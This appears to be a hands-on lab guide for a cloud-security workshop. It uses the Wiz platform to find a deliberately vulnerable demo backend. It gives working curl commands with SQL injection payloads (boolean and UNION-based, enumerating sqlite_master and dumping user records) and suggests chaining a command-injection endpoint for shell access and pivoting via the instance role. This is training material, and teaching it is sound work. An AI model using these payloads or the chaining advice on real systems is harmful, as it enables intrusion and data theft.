# **Phase 1: Manual Penetration Testing (Wiz-Enhanced)** 🔍

### **Objective**
Manually identify and exploit the SQL injection vulnerability using Wiz intelligence to guide your penetration testing strategy.

---

### **Step 1: Wiz-Powered Target Identification**

**Use Wiz to find your attack surface:**

**In Wiz Portal:**
1. Navigate to: **Inventory → Cloud Resources**
2. Filter:
   - Subscription = `TF-AWS-Connector-CodeChallange`
   - Type = `VIRTUAL_MACHINE`
3. Find: the EC2 host tagged `Name = code-challenge-backend`

**Question:** What is the public IP / DNS of the EC2 host?
**Answer:** *(Copy from Wiz resource details — the app listens directly on port 8000; there is no load balancer)*

**Alternative - Use Wiz Graph Search:**

```
Ask Mika: "Show me all publicly exposed virtual machines in subscription TF-AWS-Connector-CodeChallange"
```

---

### **Step 2: Leverage Wiz SAST Intelligence**

**Before testing, review what Wiz already knows:**

**Navigate to:** Code Security → SAST Findings

**Filter:**
- Repository: `wiz-demo/summit-code-challenge-backend`
- Severity: HIGH, CRITICAL
- Status: OPEN

**Question:** What vulnerabilities did Wiz SAST detect?
**Answer:**
1. ✅ **SQL Injection** (CWE-89) - `app/main.py:27` (unparameterized SQL query on `GET /api/users`)
2. ⚠️ **OS Command Injection** (CWE-78) - `app/main.py:35-41` (`GET /api/execute` passes input to `subprocess.Popen(..., shell=True)`)
3. ⚠️ **Insecure CORS** - `app/main.py:10-16` (`allow_origins=["*"]` with `allow_credentials=True`)

**Click on the SQL Injection finding to see:**
- Exact file path and line number
- Vulnerable code snippet
- CWE classification (CWE-89)
- OWASP mapping (A03:2021)

**Pro Tip:** Use this intelligence to craft targeted payloads!

---

### **Step 3: Map Code to Runtime with Wiz**

**Understand what's actually deployed:**

**Ask Mika:**

```
"Show me all cloud resources deployed from repository wiz-demo/summit-code-challenge-backend"
```

**Or navigate to:** Code to Cloud → Correlations

**Question:** Which container image was built from this repository?
**Answer:** `800618367342.dkr.ecr.us-east-1.amazonaws.com/code-challenge-backend:<git-sha>`
*(Terraform tags the image with the 12-char git short SHA of the deployed commit — see `infra/aws/image.tf`)*

**Question:** Where is this container running?
**Answer:**
- **Cluster:** `code-challenge` (ECS on EC2)
- **Capacity provider:** `code-challenge-ec2` (single-instance ASG)
- **Task family / image:** `code-challenge-backend` (the container name inside the task definition is `backend`)

**Use Wiz to find the container:**

```
Navigate to: Inventory → Containers
Filter: Name contains "code-challenge-backend"
```

---

### **Step 4: Wiz Network Exposure Analysis**

**Before attacking, understand the network path:**

**Ask Mika:**

```
"Show me the network exposure path for container code-challenge-backend"
```

**Or use Graph Search:**

```
"Find all publicly exposed containers in subscription TF-AWS-Connector-CodeChallange"
```

**Question:** How is the backend container exposed to the internet?
**Answer:**

```
Internet (0.0.0.0/0:8000) → EC2 host security group (code-challenge-backend)
→ ECS task (bridge network, hostPort 8000) → container (backend)
```

**Verify exposure in Wiz:**
- Navigate to: **Security Graph → Network Exposure**
- Filter: Exposed Entity = `code-challenge-backend`

---

### **Step 5: Wiz-Guided Vulnerability Testing**

**Now that you know WHAT and WHERE, test the HOW:**

**From Wiz SAST finding, you know:**
- **File:** `app/main.py`
- **Line:** 27
- **Vulnerability:** Unparameterized SQL query
- **Pattern:** Direct string concatenation in SQL

**Click "View Code" in Wiz to see the vulnerable code:**

```python
# Line 27 - VULNERABLE CODE (from Wiz SAST)
query = "SELECT id, username, email, role FROM users WHERE username = '"+username+"'"
rows = sqlite_db.execute(query).fetchall()
```

Note the backend uses an **in-memory SQLite** database, the query returns
**4 columns** (`id, username, email, role`), and the vulnerable parameter is the
`username` **query string** on `GET /api/users` — there is no login endpoint.

**Based on this intelligence, craft your attack:**

```bash
# Get the EC2 host public IP from Wiz (host:port, no load balancer)
ENDPOINT="<EC2_PUBLIC_IP_FROM_WIZ>:8000"

# Test 1: Confirm the endpoint is accessible
curl -I "http://$ENDPOINT/"

# Test 2: Benign baseline — look up a single user
curl --get "http://$ENDPOINT/api/users" \
  --data-urlencode "username=alice"

# Test 3: SQL Injection - Boolean-based (returns every user)
curl --get "http://$ENDPOINT/api/users" \
  --data-urlencode "username=' OR '1'='1"

# Test 4: SQL Injection - UNION-based (must match the 4 selected columns)
curl --get "http://$ENDPOINT/api/users" \
  --data-urlencode "username=' UNION SELECT 1,sqlite_version(),3,4-- "
```

**Question:** Which payload successfully exploited the SQL injection?
**Answer:** *(Document your successful payload)*

---

### **Step 6: Wiz-Enhanced Exploitation**

**Use Wiz to understand the data at risk:**

**Navigate to:** Data Security → Data Findings

**Filter:**
- Resource: Container `code-challenge-backend`
- Or: Subscription = `TF-AWS-Connector-CodeChallange`

**Question:** What sensitive data does Wiz detect in this environment?
**Answer:** *(Check for PII, credentials, financial data)*

**Now extract that data using SQL injection (SQLite syntax):**

```bash
# Database version (SQLite — use sqlite_version(), not @@version)
curl --get "http://$ENDPOINT/api/users" \
  --data-urlencode "username=' UNION SELECT 1,sqlite_version(),3,4-- "

# Enumerate tables (SQLite — use sqlite_master, not information_schema)
curl --get "http://$ENDPOINT/api/users" \
  --data-urlencode "username=' UNION SELECT 1,name,3,4 FROM sqlite_master WHERE type='table'-- "

# Dump the schema of the users table
curl --get "http://$ENDPOINT/api/users" \
  --data-urlencode "username=' UNION SELECT 1,sql,3,4 FROM sqlite_master WHERE name='users'-- "

# Dump all user records (id, username, email, role — there is no password column)
curl --get "http://$ENDPOINT/api/users" \
  --data-urlencode "username=' OR '1'='1"
```

---

### **Step 7: Wiz Issue Correlation**

**Check if Wiz already flagged this as a security issue:**

**Navigate to:** Issues → Risk Issues

**Filter:**
- Resource: `code-challenge-backend`
- Or: Search for "SQL Injection"

**Ask Mika:**

```
"Show me all security issues for container code-challenge-backend"
```

**Question:** Did Wiz create a security issue for this vulnerability?
**Answer:** *(Check if there's an issue combining SAST finding + exposure)*

**Typical Wiz Issue:**

```
🔴 CRITICAL: SQL Injection in Publicly Exposed Container
- SAST Finding: Unparameterized SQL Query (app/main.py:27)
- Exposure: Internet-accessible directly on the EC2 host (0.0.0.0/0:8000)
- Risk: Data breach, unauthorized access
- Affected Resource: code-challenge-backend
```

---

### **Step 8: Wiz-Powered Impact Analysis**

**Use Wiz to assess the blast radius:**

**Ask Mika:**

```
"What other resources have access to the same data as code-challenge-backend?"
```

**Or use Graph Search:**

```
"Find all resources with access to the same database as container code-challenge-backend"
```

**Question:** If this SQL injection is exploited, what else is at risk?
**Answer:** *(Use Wiz graph to map lateral movement possibilities. Note: the SQL
data lives in an in-process SQLite DB, but the same host also exposes the
`GET /api/execute` command-injection endpoint — chain it for shell access as the
container's user, then pivot via the instance role.)*
